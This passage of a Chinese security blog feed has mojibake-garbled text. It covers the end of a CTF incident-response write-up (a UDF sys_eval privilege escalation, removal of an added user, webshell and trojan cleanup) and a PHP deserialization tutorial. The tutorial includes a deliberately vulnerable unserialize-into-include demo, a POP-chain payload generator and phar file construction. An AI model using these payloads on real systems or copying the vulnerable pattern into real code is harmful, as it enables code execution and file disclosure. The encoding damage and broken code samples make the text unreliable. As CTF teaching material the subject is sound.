é™¤æ–‡ä»¶</p><p>æ€æ‰è¿›ç¨‹</p><h3 id="å‘½ä»¤åŠ«æŒ"><a href="#å‘½ä»¤åŠ«æŒ" class="headerlink" title="å‘½ä»¤åŠ«æŒ"></a>å‘½ä»¤åŠ«æŒ</h3><p><img src="/../images/image-20230402180338299-1686151030359.png" alt="image-20230402180338299"></p><h3 id="æ•°æ®åº“ä¿®å¤"><a href="#æ•°æ®åº“ä¿®å¤" class="headerlink" title="æ•°æ®åº“ä¿®å¤"></a>æ•°æ®åº“ä¿®å¤</h3><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html">MySQLä¹‹æƒé™ç®¡ç† - Iâ€™m Me! - åšå®¢å›­</a></p><p><img src="/../images/image-20230402181706798-1686151030359.png" alt="image-20230402181706798"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke file on *.* from &#x27;root&#x27;@&#x27;localhost&#x27;; # æ”¶å›æ–‡ä»¶æƒé™</span><br><span class="line">set global general_log = off; # ä¸å¯ç”¨æ—¥å¿—</span><br><span class="line">flush privileges; # åˆ·æ–°æƒé™</span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·åˆ é™¤"><a href="#ç”¨æˆ·åˆ é™¤" class="headerlink" title="ç”¨æˆ·åˆ é™¤"></a>ç”¨æˆ·åˆ é™¤</h3><p><img src="/../images/image-20230402183352852-1686151030359.png" alt="image-20230402183352852"></p><p>ç›´æ¥åˆ å°±å®Œäº‹äº†</p><h3 id="é¦–æ¬¡æ”»å‡»"><a href="#é¦–æ¬¡æ”»å‡»" class="headerlink" title="é¦–æ¬¡æ”»å‡»"></a>é¦–æ¬¡æ”»å‡»</h3><p>ç­›é€‰äº†ipå’ŒçŠ¶æ€ç ï¼Œç„¶åæ‰¾çš„ã€‚</p><p><img src="/../images/image-20230402190333789-1686151030360.png" alt="image-20230402190333789"></p><p><img src="/../images/image-20230403114840046-1686151030360.png" alt="image-20230403114840046"></p><p><img src="/../images/image-20230403114851126-1686151030360.png" alt="image-20230403114851126"></p><p>å‘ç°å®‰è£…äº†phpmyadminï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡æ˜¯é€šè¿‡æ•°æ®åº“æ”»å…¥çš„ã€‚</p><p><img src="/../images/image-20230403115435870-1686151030360.png" alt="image-20230403115435870"></p><p>ç™»å½•phpmyadminåå°æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¾ˆæ˜æ˜¾çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯ä½¿ç”¨udfåˆ›å»ºæ¶æ„å‡½æ•°sys_evalææƒ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹è¿™äº›ç›®å½•æ˜¯å¦æœ‰æ–‡ä»¶ï¼Œå¾ˆå¯èƒ½æœ‰ææƒ</span><br><span class="line">mysql\lib\plugin</span><br><span class="line"></span><br><span class="line">c:<span class="operator">/</span>windows<span class="operator">/</span>system32<span class="operator">/</span>wbem<span class="operator">/</span>mof<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230403115606245-1686151030360.png" alt="image-20230403115606245"></p><p>ä¿®å¤</p><p><img src="/../images/image-20230403123447079-1686151030360.png" alt="image-20230403123447079"></p><p>åœ¨my.iniä¸­æ·»åŠ å¦‚ä¸Šè®¾ç½®ï¼Œä¸å…è®¸å¯¼å…¥å’Œå¯¼å‡ºã€‚</p><p>è¿›è¡Œmysqlæ—¥å¿—åˆ†æï¼Œé€šè¿‡å®šä½sys_evalæ¥æŸ¥æ‰¾æ”»å‡»è€…è¿›è¡Œäº†å“ªäº›æ“ä½œ</p><p><img src="/../images/image-20230403120034903-1686151030360.png" alt="image-20230403120034903"></p><p>åªè¿›è¡Œäº†æ·»åŠ ç”¨æˆ·çš„æ“ä½œ</p><p><img src="/../images/image-20230403120253606-1686151030360.png" alt="image-20230403120253606"></p><p>ç›´æ¥åˆ é™¤è¯¥ç”¨æˆ·</p><p><img src="/../images/image-20230403120327311-1686151030360.png" alt="image-20230403120327311"></p><p>æŸ¥æ€websehll</p><p>ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·</p><p>ï¼ˆè·Ÿè¸ªipçš„è®¿é—®ï¼‰</p><p><img src="/../images/image-20230403122636304-1686151030360.png" alt="image-20230403122636304"></p><p><img src="/../images/image-20230403122604222-1686151030360.png" alt="image-20230403122604222"></p><p>åé—¨æŸ¥æ€</p><p><img src="/../images/image-20230403124818101-1686151030361.png" alt="image-20230403124818101"></p><p><img src="/../images/image-20230403124754804-1686151030361.png" alt="image-20230403124754804"></p><p>æœ¨é©¬ä½ç½®åœ¨å¯åŠ¨é¡¹</p><p><img src="/../images/image-20230403124903028-1686151030361.png" alt="image-20230403124903028"></p><p><img src="/../images/image-20230403124408821-1686151030361.png" alt="image-20230403124408821"></p><p>é€šè¿‡èµ„æºç›‘è§†å™¨å¾—åˆ°è¯¥æœ¨é©¬å¤–è”åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–</title>
      <link href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºæ•°æ®å­—èŠ‚æµï¼Œååºåˆ—åŒ–æ˜¯å°†æ•°æ®å­—èŠ‚æµè½¬æ¢æˆå¯¹è±¡ã€‚</p><p>ä¾‹å¦‚javaé‡‡ç”¨äºŒè¿›åˆ¶åºåˆ—ï¼ŒPHPé‡‡ç”¨å¯è§å­—ç¬¦ä¸²åºåˆ—ã€‚</p><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1><h2 id="éç±»åºåˆ—åŒ–"><a href="#éç±»åºåˆ—åŒ–" class="headerlink" title="éç±»åºåˆ—åŒ–"></a>éç±»åºåˆ—åŒ–</h2><p>ç›¸æ¯”äºç±»åºåˆ—åŒ–å°‘äº†å¯¹è±¡åé•¿åº¦å’Œå¯¹è±¡åç§°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»åºåˆ—åŒ–"><a href="#ç±»åºåˆ—åŒ–" class="headerlink" title="ç±»åºåˆ—åŒ–"></a>ç±»åºåˆ—åŒ–</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>å¯ä»¥å‘ç°åºåˆ—åŒ–æ—¶åªä¼šåºåˆ—åŒ–ç±»çš„å±æ€§ï¼Œè€Œä¸ä¼šåºåˆ—åŒ–ç±»çš„æ–¹æ³•ã€‚</p></blockquote><h3 id="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"><a href="#ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“" class="headerlink" title="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"></a>ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»”ç»†è§‚å¯Ÿä¼šå‘ç°protectedå’Œprivateå˜é‡åºåˆ—åŒ–åå˜é‡åé•¿åº¦å‘ç”Ÿäº†å˜åŒ–</p><ul><li><p>s:4:â€*bâ€;</p></li><li><p>s:7:â€infocâ€</p><p>æˆ‘ä»¬ç”¨010æ‰“å¼€1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>â€‹å¯ä»¥å‘ç°protectedåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00*%00</p><p>â€‹è€Œprivateåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00</p><blockquote><p>åœ¨å®é™…è¿ç”¨ä¸­å¯ä»¥ç”¨\00ï¼ˆ<code>ç©º</code>ï¼‰ç”¨%00ä»£æ›¿</p><p>åŸå› ï¼šphpçš„<code>urlencode()</code>ä¼šè‡ªåŠ¨æŠŠ<code>ç©º</code>ç¼–ç æˆ%00</p></blockquote><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: é­”æœ¯æ–¹æ³• - Manual</a></p><h3 id="å¸¸è§"><a href="#å¸¸è§" class="headerlink" title="å¸¸è§"></a>å¸¸è§</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»å¯¹è±¡æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç±»çš„ææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨constructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨destructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="comment">$name: è¢«è°ƒç”¨æ–¹æ³•çš„åå­—</span></span><br><span class="line"><span class="comment">$argumentsï¼šä¼ é€’ç»™è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶</span></span><br><span class="line"><span class="comment">1.è¾“å‡ºå¯¹è±¡ï¼šecho/printç­‰ </span></span><br><span class="line"><span class="comment">2.å‡½æ•°çš„å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œå°†å¯¹è±¡ä½œä¸ºå‚æ•°æ—¶</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§</p><p>èµ‹å€¼æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è¯»å–æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> æˆ– <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p></li><li><p>å…¶ä»–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()ï¼Œè°ƒç”¨<span class="title function_ invoke__">var_export</span>()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure></li></ul><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—åŒ–ï¼Œæ¼æ´ç‚¹å°±äº§ç”Ÿäºååºåˆ—åŒ–æ—¶ã€‚</p><p>å› ä¸ºåºåˆ—åŒ–æ•°æ®ä¸­å­˜å‚¨çš„æ˜¯ç±»å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œ<strong>è¦†ç›–å˜é‡</strong>ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li><p>å®šä½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç ï¼Œæ‰¾åˆ°å¯æ§å‚æ•°å’Œååºåˆ—åŒ–å¯¹è±¡</p></li><li><p>æ˜ç¡®è¦åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§</p></li><li><p>æ ¹æ®å…¶æ‰€åœ¨ç±»çš„é­”æœ¯æ–¹æ³•æ„é€ popé“¾ï¼ˆä¼ å…¥å‚æ•°åˆ°è§¦å‘å…³é”®å‡½æ•°,æ³¨æ„ç±»å±æ€§çš„ç±»å‹ï¼‰</p><p>åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p></li><li><p>ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–å†…å®¹(æœ€å¥½è¦urlencodeä¸€ä¸‹)ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œå®Œæˆæ”»å‡»</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›®çš„æ˜¯è¦è§¦å‘ __get() è¿™ä¸ªå‡½æ•°ï¼Œé­”æœ¯æ–¹æ³•__get()ä¼šåœ¨ç”±å¤–éƒ¨è®¿é—®å¯¹è±¡ä¸­çš„ç§æœ‰å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå…¶ä¸­å‚æ•°ä¼ªè®¿é—®å±æ€§çš„å±æ€§åã€‚å†è§‚å¯Ÿexampleè¿™ä¸ªç±»ï¼Œè¿™é‡Œå‘ç° __toStrong() æ–¹æ³•ï¼Œè€Œåˆå­˜åœ¨ <code>echo $a</code> è¿™å¥ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¦æ„é€ çš„è¿™ä¸ª $a å°±æ˜¯ exampleè¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡ä¸­çš„å±æ€§ $flag ä¹Ÿåº”ä¸º get è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œä»è€Œ æ‰§è¡Œ <code>return $this-&gt;str-&gt;flag</code>æ—¶å°±ä¼šè·³è½¬åˆ° get å¯¹è±¡çš„ é­”æœ¯æ–¹æ³• __get($name) ï¼ˆ$nameä¸ºè¦è®¿é—®çš„ç§æœ‰å±æ€§çš„åç§°ï¼Œå³ flag è¿™ä¸ªå±æ€§åï¼‰ã€‚ä¹‹åè¦ include <code>&#39;flag.php&#39;</code>ï¼Œç”±äº$name &#x3D;&#x3D; flagï¼Œæ‰€ä»¥è¦æ„é€  $flag &#x3D;&#x3D; â€˜.phpâ€™ ï¼Œæ‹¼æ¥èµ·æ¥å°±å¯ä»¥åŒ…å« â€˜flag.phpâ€™ ä»è€Œæ‹¿åˆ°flagã€‚</p><p>å³</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="pharååºåˆ—åŒ–â€“PHP-lt-8"><a href="#pharååºåˆ—åŒ–â€“PHP-lt-8" class="headerlink" title="pharååºåˆ—åŒ–â€“PHP&lt;8"></a>pharååºåˆ—åŒ–â€“PHP&lt;8</h1><h2 id="pharæ˜¯ä»€ä¹ˆ"><a href="#pharæ˜¯ä»€ä¹ˆ" class="headerlink" title="pharæ˜¯ä»€ä¹ˆ"></a>pharæ˜¯ä»€ä¹ˆ</h2><ol><li><p>åŠŸèƒ½ï¼šå‹ç¼©æ–‡ä»¶ï¼Œå°†å†…å®¹åºåˆ—åŒ–å­˜å‚¨</p></li><li><p>å¦‚ä½•ç”Ÿæˆï¼š</p><blockquote><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOff,å¹¶åˆ é™¤å‰é¢çš„;å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶æ ¼å¼</p><p>ç”¨010æ‰“å¼€ç”Ÿæˆçš„test.pharï¼Œè§‚å¯Ÿpharæ–‡ä»¶çš„å››ä¸ªç»„æˆéƒ¨åˆ†</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>â€‹    å…³æ³¨stubå’Œmanifest</p><p>â€‹stubï¼špharè¯†åˆ«æ ‡å¿—ï¼Œåªè¦æœ‰äº†è¿™ä¸ªè¯†åˆ«æ ‡å¿—ï¼Œ<strong>å³ä½¿åç¼€åä¸ä¸ºpharï¼Œphpä»èƒ½å¤Ÿå°†æ–‡ä»¶è¯†åˆ«ä¸ºpharæ–‡ä»¶</strong></p><p>â€‹manifestï¼šè¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼Œæ˜¯ååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹</p><p>â€‹    